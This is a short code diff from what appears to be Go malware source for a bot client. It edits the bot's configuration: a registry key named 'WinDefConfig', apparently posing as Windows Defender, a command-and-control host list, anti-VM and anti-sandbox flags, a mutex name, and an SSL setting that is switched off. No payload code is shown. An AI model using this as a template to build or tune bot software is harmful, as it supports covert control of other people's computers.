@@ -49,7 +49,7 @@ var (
 
 	g_guid        = ""
 	g_token       = ""
-	g_regpath     = "Software/WinDefConfig"
+	g_regpath     = `Software\WinDefConfig`
 	g_installdate = ""
 
 	// Dlls loading
@@ -76,7 +76,7 @@ var (
 	pfnGetKeyboardLayout    = user32.NewProc("GetKeyboardLayout")
 
 	botcore = BotCore{
-		version:       "1.6.8",
+		version:       "1.7.8",
 		hosts:         []string{"127.0.0.1:8080"},
 		singleton:     true,
 		sington_mutex: 0,
@@ -84,7 +84,7 @@ var (
 		anti_vm:       false,
 		anti_sandbox:  false,
 		install:       false,
-		use_ssl:       true,
+		use_ssl:       false,
 		root_pem:      "",
 		delay:         0,
 		mutex_name:    "eSq3w0KtD7gDMR7q",
